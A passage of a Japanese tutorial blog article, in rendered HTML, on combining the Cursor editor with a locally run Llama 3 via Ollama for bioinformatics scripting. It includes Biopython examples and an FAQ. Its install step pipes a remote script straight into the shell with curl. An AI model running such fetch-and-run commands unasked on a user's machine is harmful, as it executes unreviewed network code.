data-sourcepos=\"133:1-133:53\">\n<span id=\"-実践編動くコードコマンド例\" class=\"fragment\"></span><a href=\"#-%E5%AE%9F%E8%B7%B5%E7%B7%A8%E5%8B%95%E3%81%8F%E3%82%B3%E3%83%BC%E3%83%89%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89%E4%BE%8B\"><i class=\"fa fa-link\"></i></a>🧪 実践編：動くコード／コマンド例</h2>\n<h3 data-sourcepos=\"135:1-135:19\">\n<span id=\"1-環境構築\" class=\"fragment\"></span><a href=\"#1-%E7%92%B0%E5%A2%83%E6%A7%8B%E7%AF%89\"><i class=\"fa fa-link\"></i></a>1. 環境構築</h3>\n<h4 data-sourcepos=\"137:1-137:35\">\n<span id=\"a-cursorのインストール\" class=\"fragment\"></span><a href=\"#a-cursor%E3%81%AE%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB\"><i class=\"fa fa-link\"></i></a>a. Cursorのインストール</h4>\n<ol data-sourcepos=\"138:1-141:0\">\n<li data-sourcepos=\"138:1-138:133\">\n<a href=\"https://cursor.sh/\" rel=\"nofollow noopener\" target=\"_blank\">公式サイト</a>にアクセスし、お使いのOS用のインストーラをダウンロードします。</li>\n<li data-sourcepos=\"139:1-139:112\">ダウンロードしたファイルを実行し、アプリケーションをインストールします。</li>\n<li data-sourcepos=\"140:1-141:0\">起動するとVSCodeと非常によく似た画面が表示されます。既存のVSCode設定や拡張機能もインポートできます。</li>\n</ol>\n<h4 data-sourcepos=\"142:1-142:56\">\n<span id=\"b-ollamaのインストールとセットアップ\" class=\"fragment\"></span><a href=\"#b-ollama%E3%81%AE%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB%E3%81%A8%E3%82%BB%E3%83%83%E3%83%88%E3%82%A2%E3%83%83%E3%83%97\"><i class=\"fa fa-link\"></i></a>b. Ollamaのインストールとセットアップ</h4>\n<p data-sourcepos=\"144:1-144:28\"><strong>macOS / Linux の場合:</strong></p>\n<div class=\"code-frame\" data-lang=\"bash\" data-sourcepos=\"145:1-148:3\"><div class=\"highlight\"><pre><code><span class=\"c\"># 公式サイトのインストールスクリプトを実行</span>\ncurl <span class=\"nt\">-fsSL</span> https://ollama.com/install.sh | sh\n</code></pre></div></div>\n<p data-sourcepos=\"150:1-151:115\"><strong>Windows の場合:</strong><br>\n<a href=\"https://ollama.com/download\" rel=\"nofollow noopener\" target=\"_blank\">公式サイト</a>からインストーラをダウンロードして実行します。</p>\n<p data-sourcepos=\"153:1-154:158\"><strong>Llama 3 (8B) モデルのダウンロード:</strong><br>\nインストール後、ターミナルで以下のコマンドを実行します。モデルのダウンロードが始まります（数GBあります）。</p>\n<div class=\"code-frame\" data-lang=\"bash\" data-sourcepos=\"156:1-164:3\"><div class=\"highlight\"><pre><code><span class=\"c\"># Llama 3 (8B) instructモデルをプル</span>\nollama pull llama3:8b\n\n<span class=\"c\"># 成功ログの例</span>\n<span class=\"c\"># pulling manifest</span>\n<span class=\"c\"># pulling 2ab3b58f9049... 100% ▕██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████- 4.7g/s 4.7 GB</span>\n<span class=\"c\"># success</span>\n</code></pre></div></div>\n<h3 data-sourcepos=\"166:1-166:45\">\n<span id=\"2-cursorによるクラウドai活用例\" class=\"fragment\"></span><a href=\"#2-cursor%E3%81%AB%E3%82%88%E3%82%8B%E3%82%AF%E3%83%A9%E3%82%A6%E3%83%89ai%E6%B4%BB%E7%94%A8%E4%BE%8B\"><i class=\"fa fa-link\"></i></a>2. CursorによるクラウドAI活用例</h3>\n<p data-sourcepos=\"168:1-168:111\">ここでは、一般的なバイオインフォマティクスのタスクをCursorに依頼してみます。</p>\n<p data-sourcepos=\"170:1-170:188\"><strong>シナリオ:</strong> <code>monster_sequences.fasta</code> というFASTA形式のファイルから、特定のID (<code>MONSTER_007</code>) を持つ配列を抽出するPythonスクリプトを作成します。</p>\n<ol data-sourcepos=\"172:1-185:0\">\n<li data-sourcepos=\"172:1-172:62\">\n<code>main.py</code> という空のファイルを作成します。</li>\n<li data-sourcepos=\"173:1-183:7\">\n<code>Cmd+L</code> (Windows/Linux: <code>Ctrl+L</code>) でチャットウィンドウを開き、以下のプロンプトを入力します。\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"174:5-183:7\"><div class=\"highlight\"><pre><code>あなたは熟練のPythonプログラマです。\nBiopythonライブラリを使って、FASTAファイルから特定のIDを持つシーケンスを抽出するコマンドラインツールを作成してください。\n\n要件：\n- 入力ファイルパスとシーケンスIDを引数として受け取ること。\n- 該当するIDが見つかった場合は、そのシーケンスを標準出力に出力すること。\n- 見つからなかった場合は、エラーメッセージを出力すること。\n- argparseを使って、使いやすいインターフェースにすること。\n</code></pre></div></div>\n</li>\n<li data-sourcepos=\"184:1-185:0\">AIがコードを生成します。以下はその一例です。</li>\n</ol>\n<div class=\"code-frame\" data-lang=\"python\" data-sourcepos=\"186:1-229:3\"><div class=\"highlight\"><pre><code><span class=\"c1\"># main.py (AIが生成したコード)\n</span><span class=\"kn\">import</span> <span class=\"n\">argparse</span>\n<span class=\"kn\">from</span> <span class=\"n\">Bio</span> <span class=\"kn\">import</span> <span class=\"n\">SeqIO</span>\n<span class=\"kn\">import</span> <span class=\"n\">sys</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">extract_sequence_by_id</span><span class=\"p\">(</span><span class=\"n\">fasta_file</span><span class=\"p\">,</span> <span class=\"n\">sequence_id</span><span class=\"p\">):</span>\n    <span class=\"sh\">\"\"\"</span><span class=\"s\">\n    Extracts a sequence from a FASTA file by its ID.\n\n    Args:\n        fasta_file (str): Path to the input FASTA file.\n        sequence_id (str): The ID of the sequence to extract.\n\n    Returns:\n        Bio.SeqRecord.SeqRecord or None: The found sequence record, or None if not found.\n    </span><span class=\"sh\">\"\"\"</span>\n    <span class=\"k\">try</span><span class=\"p\">:</span>\n        <span class=\"k\">for</span> <span class=\"n\">record</span> <span class=\"ow\">in</span> <span class=\"n\">SeqIO</span><span class=\"p\">.</span><span class=\"nf\">parse</span><span class=\"p\">(</span><span class=\"n\">fasta_file</span><span class=\"p\">,</span> <span class=\"sh\">\"</span><span class=\"s\">fasta</span><span class=\"sh\">\"</span><span class=\"p\">):</span>\n            <span class=\"k\">if</span> <span class=\"n\">record</span><span class=\"p\">.</span><span class=\"nb\">id</span> <span class=\"o\">==</span> <span class=\"n\">sequence_id</span><span class=\"p\">:</span>\n                <span class=\"k\">return</span> <span class=\"n\">record</span>\n        <span class=\"k\">return</span> <span class=\"bp\">None</span>\n    <span class=\"k\">except</span> <span class=\"nb\">FileNotFoundError</span><span class=\"p\">:</span>\n        <span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"sa\">f</span><span class=\"sh\">\"</span><span class=\"s\">Error: The file </span><span class=\"sh\">'</span><span class=\"si\">{</span><span class=\"n\">fasta_file</span><span class=\"si\">}</span><span class=\"sh\">'</span><span class=\"s\"> was not found.</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"nb\">file</span><span class=\"o\">=</span><span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">stderr</span><span class=\"p\">)</span>\n        <span class=\"k\">return</span> <span class=\"bp\">None</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">main</span><span class=\"p\">():</span>\n    <span class=\"n\">parser</span> <span class=\"o\">=</span> <span class=\"n\">argparse</span><span class=\"p\">.</span><span class=\"nc\">ArgumentParser</span><span class=\"p\">(</span><span class=\"n\">description</span><span class=\"o\">=</span><span class=\"sh\">\"</span><span class=\"s\">Extract a specific sequence from a FASTA file.</span><span class=\"sh\">\"</span><span class=\"p\">)</span>\n    <span class=\"n\">parser</span><span class=\"p\">.</span><span class=\"nf\">add_argument</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">fasta_file</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"nb\">help</span><span class=\"o\">=</span><span class=\"sh\">\"</span><span class=\"s\">Path to the input FASTA file.</span><span class=\"sh\">\"</span><span class=\"p\">)</span>\n    <span class=\"n\">parser</span><span class=\"p\">.</span><span class=\"nf\">add_argument</span><span class=\"p\">(</span><span class=\"sh\">\"</span><span class=\"s\">sequence_id</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"nb\">help</span><span class=\"o\">=</span><span class=\"sh\">\"</span><span class=\"s\">The ID of the sequence to extract.</span><span class=\"sh\">\"</span><span class=\"p\">)</span>\n    <span class=\"n\">args</span> <span class=\"o\">=</span> <span class=\"n\">parser</span><span class=\"p\">.</span><span class=\"nf\">parse_args</span><span class=\"p\">()</span>\n\n    <span class=\"n\">found_record</span> <span class=\"o\">=</span> <span class=\"nf\">extract_sequence_by_id</span><span class=\"p\">(</span><span class=\"n\">args</span><span class=\"p\">.</span><span class=\"n\">fasta_file</span><span class=\"p\">,</span> <span class=\"n\">args</span><span class=\"p\">.</span><span class=\"n\">sequence_id</span><span class=\"p\">)</span>\n\n    <span class=\"k\">if</span> <span class=\"n\">found_record</span><span class=\"p\">:</span>\n        <span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"sa\">f</span><span class=\"sh\">\"</span><span class=\"s\">&gt;</span><span class=\"si\">{</span><span class=\"n\">found_record</span><span class=\"p\">.</span><span class=\"n\">description</span><span class=\"si\">}</span><span class=\"sh\">\"</span><span class=\"p\">)</span>\n        <span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"n\">found_record</span><span class=\"p\">.</span><span class=\"n\">seq</span><span class=\"p\">)</span>\n    <span class=\"k\">else</span><span class=\"p\">:</span>\n        <span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"sa\">f</span><span class=\"sh\">\"</span><span class=\"s\">Sequence with ID </span><span class=\"sh\">'</span><span class=\"si\">{</span><span class=\"n\">args</span><span class=\"p\">.</span><span class=\"n\">sequence_id</span><span class=\"si\">}</span><span class=\"sh\">'</span><span class=\"s\"> not found in </span><span class=\"sh\">'</span><span class=\"si\">{</span><span class=\"n\">args</span><span class=\"p\">.</span><span class=\"n\">fasta_file</span><span class=\"si\">}</span><span class=\"sh\">'</span><span class=\"s\">.</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"nb\">file</span><span class=\"o\">=</span><span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">stderr</span><span class=\"p\">)</span>\n        <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"nf\">exit</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">)</span>\n\n<span class=\"k\">if</span> <span class=\"n\">__name__</span> <span class=\"o\">==</span> <span class=\"sh\">\"</span><span class=\"s\">__main__</span><span class=\"sh\">\"</span><span class=\"p\">:</span>\n    <span class=\"nf\">main</span><span class=\"p\">()</span>\n</code></pre></div></div>\n<ol data-sourcepos=\"231:1-233:0\">\n<li data-sourcepos=\"231:1-233:0\">次に、このコードをリファクタリングしてみましょう。<code>extract_sequence_by_id</code>関数を選択して<code>Cmd+K</code> (Ctrl+K) を押し、こう指示します。<br>\n<code>この関数に型ヒントを追加し、docstringをGoogleスタイルに変更してください。</code>\n</li>\n</ol>\n<p data-sourcepos=\"234:1-234:86\">すると、AIが即座にコードを以下のように書き換えてくれます。</p>\n<div class=\"code-frame\" data-lang=\"python\" data-sourcepos=\"236:1-266:3\"><div class=\"highlight\"><pre><code><span class=\"c1\"># main.py (リファクタリング後のコード)\n</span><span class=\"kn\">import</span> <span class=\"n\">argparse</span>\n<span class=\"kn\">from</span> <span class=\"n\">Bio</span> <span class=\"kn\">import</span> <span class=\"n\">SeqIO</span>\n<span class=\"kn\">from</span> <span class=\"n\">Bio.SeqRecord</span> <span class=\"kn\">import</span> <span class=\"n\">SeqRecord</span>\n<span class=\"kn\">import</span> <span class=\"n\">sys</span>\n<span class=\"kn\">from</span> <span class=\"n\">typing</span> <span class=\"kn\">import</span> <span class=\"n\">Optional</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">extract_sequence_by_id</span><span class=\"p\">(</span><span class=\"n\">fasta_file</span><span class=\"p\">:</span> <span class=\"nb\">str</span><span class=\"p\">,</span> <span class=\"n\">sequence_id</span><span class=\"p\">:</span> <span class=\"nb\">str</span><span class=\"p\">)</span> <span class=\"o\">-&gt;</span> <span class=\"n\">Optional</span><span class=\"p\">[</span><span class=\"n\">SeqRecord</span><span class=\"p\">]:</span>\n    <span class=\"sh\">\"\"\"</span><span class=\"s\">Extracts a sequence from a FASTA file by its ID.\n\n    Args:\n        fasta_file (str): Path to the input FASTA file.\n        sequence_id (str): The ID of the sequence to extract.\n\n    Returns:\n        Optional[SeqRecord]: The found sequence record, or None if not found or\n                             if the file does not exist.\n    </span><span class=\"sh\">\"\"\"</span>\n    <span class=\"k\">try</span><span class=\"p\">:</span>\n        <span class=\"k\">for</span> <span class=\"n\">record</span> <span class=\"ow\">in</span> <span class=\"n\">SeqIO</span><span class=\"p\">.</span><span class=\"nf\">parse</span><span class=\"p\">(</span><span class=\"n\">fasta_file</span><span class=\"p\">,</span> <span class=\"sh\">\"</span><span class=\"s\">fasta</span><span class=\"sh\">\"</span><span class=\"p\">):</span>\n            <span class=\"k\">if</span> <span class=\"n\">record</span><span class=\"p\">.</span><span class=\"nb\">id</span> <span class=\"o\">==</span> <span class=\"n\">sequence_id</span><span class=\"p\">:</span>\n                <span class=\"k\">return</span> <span class=\"n\">record</span>\n        <span class=\"k\">return</span> <span class=\"bp\">None</span>\n    <span class=\"k\">except</span> <span class=\"nb\">FileNotFoundError</span><span class=\"p\">:</span>\n        <span class=\"nf\">print</span><span class=\"p\">(</span><span class=\"sa\">f</span><span class=\"sh\">\"</span><span class=\"s\">Error: The file </span><span class=\"sh\">'</span><span class=\"si\">{</span><span class=\"n\">fasta_file</span><span class=\"si\">}</span><span class=\"sh\">'</span><span class=\"s\"> was not found.</span><span class=\"sh\">\"</span><span class=\"p\">,</span> <span class=\"nb\">file</span><span class=\"o\">=</span><span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">stderr</span><span class=\"p\">)</span>\n        <span class=\"k\">return</span> <span class=\"bp\">None</span>\n\n<span class=\"c1\"># (main関数は変更なし)\n</span><span class=\"bp\">...</span>\n</code></pre></div></div>\n<p data-sourcepos=\"268:1-268:111\">このように、対話的にコーディングとリファクタリングを進めることができます。</p>\n<h3 data-sourcepos=\"270:1-270:46\">\n<span id=\"3-ollamaによるローカルllm活用例\" class=\"fragment\"></span><a href=\"#3-ollama%E3%81%AB%E3%82%88%E3%82%8B%E3%83%AD%E3%83%BC%E3%82%AB%E3%83%ABllm%E6%B4%BB%E7%94%A8%E4%BE%8B\"><i class=\"fa fa-link\"></i></a>3. OllamaによるローカルLLM活用例</h3>\n<p data-sourcepos=\"272:1-272:192\"><strong>シナリオ:</strong> モンスターの機密ゲノムデータ（という想定のダミーデータ）を含むスクリプトのデバッグを、情報を外部に送らずに行います。</p>\n<ol data-sourcepos=\"274:1-329:0\">\n<li data-sourcepos=\"274:1-282:0\">\n<p data-sourcepos=\"274:5-274:76\">まず、ターミナルでOllamaの対話モードを開始します。</p>\n<div class=\"code-frame\" data-lang=\"bash\" data-sourcepos=\"275:5-277:7\"><div class=\"highlight\"><pre><code>ollama run llama3:8b\n</code></pre></div></div>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"278:5-280:7\"><div class=\"highlight\"><pre><code>&gt;&gt;&gt;\n</code></pre></div></div>\n<p data-sourcepos=\"281:5-281:76\">とプロンプトが表示され、入力待機状態になります。</p>\n</li>\n<li data-sourcepos=\"283:1-329:0\">\n<p data-sourcepos=\"283:5-283:215\">ここに、デバッグしたいコードに関する質問を貼り付けます。<strong>機密データそのものではなく、コードのロジックに関する質問をすることがポイントです。</strong></p>\n<p data-sourcepos=\"285:5-285:27\"><strong>プロンプト例:</strong></p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"286:5-291:7\"><div class=\"highlight\"><pre><code>Pythonのコードについて質問です。\n`data`という文字列があり、ここには'A', 'T', 'G', 'C'以外の文字（例えば'N'）が含まれている可能性があります。\nこの文字列から'N'の数を数えるコードを書いていますが、`data.count('N')`よりも効率的な方法はありますか？\nデータは非常に長くなる可能性があります（数ギガバイト）。\n</code></pre></div></div>\n<p data-sourcepos=\"293:5-293:44\"><strong>Ollama (Llama 3) からの回答例:</strong></p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"294:5-314:7\"><div class=\"highlight\"><pre><code>こんにちは！興味深い質問ですね。巨大な文字列で特定の文字を数える場合、パフォーマンスは重要になります。\n\n`data.count('N')`はシンプルで読みやすいですが、PythonのC言語実装レベルで最適化されており、非常に高速です。ほとんどの場合、これで十分です。\n\nしかし、メモリ効率をさらに考慮する場合や、文字列を一度にメモリにロードできない場合は、ジェネレータ式やイテレータを使うアプローチが考えられます。\n\n例えば、ファイルを一行ずつ読み込んで処理する場合：\n\n```python\ndef count_char_in_file(filepath, char_to_count):\n    count = 0\n    with open(filepath, 'r') as f:\n        for line in f:\n            count += line.count(char_to_count)\n    return count\n\n# 使い方\n# n_count = count_char_in_file('huge_genome_file.txt', 'N')\n# print(f\"The character 'N' appears {n_count} times.\")\n</code></pre></div></div>\n<p data-sourcepos=\"316:5-316:160\">この方法は、ファイル全体を一度にメモリに読み込まないため、巨大なファイルに対してもメモリ効率が良いです。</p>\n<p data-sourcepos=\"318:5-318:160\">もし文字列がすでにメモリ上にあるが、他の処理と並行してカウントしたい場合は、単純なループも考えられます。</p>\n<div class=\"code-frame\" data-lang=\"python\" data-sourcepos=\"320:5-323:7\"><div class=\"highlight\"><pre><code><span class=\"n\">data</span> <span class=\"o\">=</span> <span class=\"sh\">\"</span><span class=\"s\">ATGCGNATGC...</span><span class=\"sh\">\"</span> <span class=\"c1\"># 巨大な文字列と仮定\n</span><span class=\"n\">n_count</span> <span class=\"o\">=</span> <span class=\"nf\">sum</span><span class=\"p\">(</span><span class=\"mi\">1</span> <span class=\"k\">for</span> <span class=\"n\">char</span> <span class=\"ow\">in</span> <span class=\"n\">data</span> <span class=\"k\">if</span> <span class=\"n\">char</span> <span class=\"o\">==</span> <span class=\"sh\">'</span><span class=\"s\">N</span><span class=\"sh\">'</span><span class=\"p\">)</span>\n</code></pre></div></div>\n<p data-sourcepos=\"325:5-325:244\">このジェネレータ式を使った方法は、<code>count()</code>メソッドとパフォーマンス的には大差ないことが多いですが、より複雑な条件（例：'N'または'n'を数える）を追加するのが容易です。</p>\n<p data-sourcepos=\"327:5-327:246\">結論として、シンプルさで言えば<code>data.count('N')</code>が最善です。メモリが懸念される巨大なファイルの場合は、ファイルをチャンクまたは行ごとに読み込むアプローチをお勧めします。</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"328:5-330:141\"><div class=\"highlight\"><pre><code>\n</code></pre></div></div>\n</li>\n</ol>\n<p data-sourcepos=\"330:1-330:141\">このように、ローカル環境で完結させながら、具体的なコードの改善案や代替案を得ることができます。</p>\n<h3 data-sourcepos=\"332:1-332:84\">\n<span id=\"4-ハイブリッド戦略の実践-cursorからローカルllmを呼び出す\" class=\"fragment\"></span><a href=\"#4-%E3%83%8F%E3%82%A4%E3%83%96%E3%83%AA%E3%83%83%E3%83%89%E6%88%A6%E7%95%A5%E3%81%AE%E5%AE%9F%E8%B7%B5-cursor%E3%81%8B%E3%82%89%E3%83%AD%E3%83%BC%E3%82%AB%E3%83%ABllm%E3%82%92%E5%91%BC%E3%81%B3%E5%87%BA%E3%81%99\"><i class=\"fa fa-link\"></i></a>4. ハイブリッド戦略の実践: CursorからローカルLLMを呼び出す</h3>\n<p data-sourcepos=\"334:1-334:98\">Cursorの真価は、使用するAIモデルを柔軟に切り替えられる点にあります。</p>\n<ol data-sourcepos=\"336:1-341:0\">\n<li data-sourcepos=\"336:1-336:67\">Cursorで <code>Cmd+,</code> (Ctrl+,) を押して設定を開きます。</li>\n<li data-sourcepos=\"337:1-337:84\">\"Models\" を検索し、\"Model Provider\" のセクションを見つけます。</li>\n<li data-sourcepos=\"338:1-338:76\">\"Add a new model...\" をクリックし、\"Ollama\" を選択します。</li>\n<li data-sourcepos=\"339:1-339:86\">設定で、使用したいモデル名（例: <code>llama3:8b</code>）を入力します。</li>\n<li data-sourcepos=\"340:1-341:0\">これで、チャットウィンドウやインライン編集時に、モデル選択ドロップダウンから<code>Ollama/llama3:8b</code>を選べるようになります。</li>\n</ol>\n<p data-sourcepos=\"342:1-342:246\">これにより、「この一般的な関数はGPT-4で生成し、この機密データに触れる部分のデバッグはローカルのLlama 3で」といった使い分けが、同じエディタ内でシームレスに実現できます。</p>\n<hr data-sourcepos=\"344:1-345:0\">\n<h2 data-sourcepos=\"346:1-346:35\">\n<span id=\"-応用発展実用例\" class=\"fragment\"></span><a href=\"#-%E5%BF%9C%E7%94%A8%E7%99%BA%E5%B1%95%E5%AE%9F%E7%94%A8%E4%BE%8B\"><i class=\"fa fa-link\"></i></a>🚀 応用・発展・実用例</h2>\n<p data-sourcepos=\"348:1-348:83\">このハイブリッドAI解析環境は、様々な場面で応用できます。</p>\n<ul data-sourcepos=\"350:1-358:0\">\n<li data-sourcepos=\"350:1-350:394\">\n<strong>新規パイプラインの設計</strong>: NextflowやSnakemakeのようなワークフロー言語のボイラープレートをAIに生成させ、迅速にパイプラインの骨格を作ることができます。「Snakemakeを使って、FASTQファイルをTrimmomaticでトリミングし、BWAでマッピングするルールの雛形を書いて」といった指示が有効です。</li>\n<li data-sourcepos=\"351:1-351:254\">\n<strong>データ可視化の高速化</strong>: MatplotlibやSeabornを使った複雑なグラフ（例: 火山プロット、クラスタリングのヒートマップ）の描画コードをAIに生成させ、自分はデータの解釈に集中できます。</li>\n<li data-sourcepos=\"352:1-354:264\">\n<strong>他技術との統合</strong>:\n<ul data-sourcepos=\"353:5-354:264\">\n<li data-sourcepos=\"353:5-353:239\">\n<strong>Docker</strong>: <code>Dockerfile</code>の作成や最適化をAIに相談できます。「Python 3.10ベースで、BiopythonとPandasをインストールするDockerfileを書いて」と依頼すれば、すぐに雛形が手に入ります。</li>\n<li data-sourcepos=\"354:5-354:264\">\n<strong>Jupyter</strong>: データ探索フェーズでは、Jupyter Lab内で<a href=\"https://github.com/jupyter-ai/jupyter-ai\" rel=\"nofollow noopener\" target=\"_blank\">Jupyter AI</a>拡張機能を使うことで、ノートブック上で直接LLMと対話し、コードセルを生成させることが可能です。</li>\n</ul>\n</li>\n<li data-sourcepos=\"355:1-358:0\">\n<strong>モンスター生命体の解析への応用</strong>:\n<ul data-sourcepos=\"356:5-358:0\">\n<li data-sourcepos=\"356:5-356:209\">未知の遺伝子配列が与えられた際、「この配列に似た機能を持つ既知の遺伝子をBLASTで検索するためのBiopythonスクリプトを書いて」とCursorに依頼する。</li>\n<li data-sourcepos=\"357:5-358:0\">発見された新種モンスターのゲノムアセンブリ結果（機密）について、「このアセンブリ結果に含まれるコンティグのN50を計算するPythonスクリプトを、メモリ効率を考慮して書いて」とOllamaに相談する。</li>\n</ul>\n</li>\n</ul>\n<hr data-sourcepos=\"359:1-360:0\">\n<h2 data-sourcepos=\"361:1-361:32\">\n<span id=\"-まとめtakeaways\" class=\"fragment\"></span><a href=\"#-%E3%81%BE%E3%81%A8%E3%82%81takeaways\"><i class=\"fa fa-link\"></i></a>📝 まとめ（Takeaways）</h2>\n<p data-sourcepos=\"363:1-363:110\">この記事で紹介した「ハイブリッドAI解析環境」の重要なポイントをまとめます。</p>\n<ul data-sourcepos=\"365:1-370:0\">\n<li data-sourcepos=\"365:1-365:198\">\n<strong>AIは「相棒」</strong>: AI駆動開発は、単なるコード補完ではなく、設計・実装・デバッグ・ドキュメント化の全工程を支援する強力なパートナーです。</li>\n<li data-sourcepos=\"366:1-366:202\">\n<strong>Cursorで開発を加速</strong>: AIネイティブエディタCursorは、深いコンテキスト理解とシームレスな対話機能により、開発体験を次のレベルに引き上げます。</li>\n<li data-sourcepos=\"367:1-367:211\">\n<strong>Ollamaでセキュリティを確保</strong>: 機密データを扱う際は、Ollamaを使ってローカル環境でLLMを実行することで、情報漏洩のリスクなくAIの恩恵を受けられます。</li>\n<li data-sourcepos=\"368:1-368:259\">\n<strong>ハイブリッドが最適解</strong>: クラウドAIの性能とローカルLLMのセキュリティを使い分ける「ハイブリッド戦略」が、現代の多くの開発・解析業務において現実的かつ強力なソリューションです。</li>\n<li data-sourcepos=\"369:1-370:0\">\n<strong>まずは試すことから</strong>: CursorとOllamaのインストールは非常に簡単です。まずは手元のPCに導入し、日々のちょっとした作業からAIに任せてみることをお勧めします。</li>\n</ul>\n<hr data-sourcepos=\"371:1-372:0\">\n<h2 data-sourcepos=\"373:1-373:55\">\n<span id=\"-faq読者が抱きそうな疑問と回答\" class=\"fragment\"></span><a href=\"#-faq%E8%AA%AD%E8%80%85%E3%81%8C%E6%8A%B1%E3%81%8D%E3%81%9D%E3%81%86%E3%81%AA%E7%96%91%E5%95%8F%E3%81%A8%E5%9B%9E%E7%AD%94\"><i class=\"fa fa-link\"></i></a>❓ FAQ（読者が抱きそうな疑問と回答）</h2>\n<p data-sourcepos=\"375:1-376:410\"><strong>Q1: マシンスペックが低いPCでもローカルLLMは使えますか？</strong><br>\nA1: はい、使えますがモデルの選択が重要になります。Ollamaは比較的軽量ですが、快適な動作には16GB以上のRAMを推奨します。もし動作が重い場合は、<code>llama3:8b</code>よりもさらに小さいモデル、例えば<code>tinydolphin</code>や<code>qwen:4b</code>などを試してみてください。これらは性能は少し落ちますが、要求スペックは低くなります。</p>\n<p data-sourcepos=\"378:1-379:484\"><strong>Q2: Cursorは無料ですか？ 有料プランとの違いは何ですか？</strong><br>\nA2: Cursorには無料枠があります。無料枠では、GPT-4などの高性能モデルを月に一定回数利用できます。回数制限を超えて利用したい場合や、より高度な機能（プロジェクト全体をAIに読み込ませる\"Auto-repo\"など）を使いたい場合は、有料プランへのアップグレードが必要です。ただし、Ollamaと連携してローカルLLMを使う分には、回数制限なく無料で利用できます。</p>\n<p data-sourcepos=\"381:1-382:394\"><strong>Q3: AIが生成したコードの信頼性はどのように担保すればよいですか？</strong><br>\nA3: 非常に重要な質問です。AIが生成したコードは<strong>絶対に鵜呑みにしてはいけません</strong>。それはあくまで「非常に優秀なアシスタントが書いた下書き」と捉えるべきです。特に、バイオインフォマティクスのような科学的な正確性が求められる分野では、以下の点を確認することが不可欠です。</p>\n<ol data-sourcepos=\"383:1-386:0\">\n<li data-sourcepos=\"383:1-383:154\">\n<strong>ロジックの検証</strong>: 生成されたコードのアルゴリズムが、意図した解析手法と一致しているか必ず確認します。</li>\n<li data-sourcepos=\"384:1-384:142\">\n<strong>テスト</strong>: 小さなダミーデータセットでコードを動かし、期待通りの結果が得られるかテストします。</li>\n<li data-sourcepos=\"385:1-386:0\">\n<strong>ライブラリのドキュメント参照</strong>: 使用されている関数やオプションが適切か、公式ドキュメントで裏を取る習慣をつけましょう。</li>\n</ol>\n<hr data-sourcepos=\"387:1-388:0\">\n<h2 data-sourcepos=\"389:1-389:35\">\n<span id=\"-参考文献リンク集\" class=\"fragment\"></span><a 